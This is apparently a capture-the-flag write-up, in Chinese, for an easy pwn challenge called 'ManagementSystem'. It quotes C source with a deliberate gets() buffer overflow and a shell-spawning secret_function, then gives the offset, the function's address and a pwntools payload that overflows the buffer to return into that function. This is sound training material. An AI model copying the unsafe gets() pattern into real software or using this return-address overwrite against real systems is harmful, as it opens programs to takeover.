# ManagementSystem

## Information

- `MyFirstCTF` `Easy`
- `Pwn`

這個系統，看起來好像有點問題...。請利用你的技能和知識，找到漏洞並利用它們吧！

flag format : FLAG{xxx}

Author : Richard ( dogxxx)

## Solution

題目有提供 src，可以從其中進行 code review 觀察。

- src
    ```c
    ...
    void secret_function() {
    printf("Congratulations! You've successfully executed the secret function.\n");
    char *shell_args[] = {"/bin/sh", NULL};
    execv(shell_args[0], shell_args);
    }
    ...
    User *delete_user(User *head) {
    printf("Enter the index of the user you want to delete: ");
    char buffer[64];
    gets(buffer); 
    ...
    ```

查看 src，可以發現 `delete_user` 中存在一個 `gets()`，代表這個地方肯定很好用，並且會發現一個很好的跳轉點。

- 為了能觸發 `gets()` ，需要先將前面的資訊輸入完成，才能觸發這裡。
    ```
    Choose an option:
    1. Add user
    2. Show users
    3. Delete user
    4. Exit
    >
    ```

- gdb 後抓 offset 為多少。
    - offset=12*8+8

- 因為 PIE 沒開，所以可以找出 `secret_function` 的位址為多少。
    - secret_function_address = 0x000000000040131b

- payload
    ```py
    # payload 1 (add user)
    p.sendlineafter(b'> ', '1')
    p.sendlineafter(b'Enter username (max 31 characters):', b'a')
    p.sendlineafter(b'Enter user account (max 15 characters):', b'a')
    p.sendlineafter(b'Enter user password (max 15 characters):', b'a')
    
    #gdb.attach(p)
    
    # payload 2 (crack gets)
    p.sendlineafter(b'> ', '3')
    p.sendlineafter(b'Enter the index of the user you want to delete:', b'a'*8*13+p64(secret_function_address))
    ```
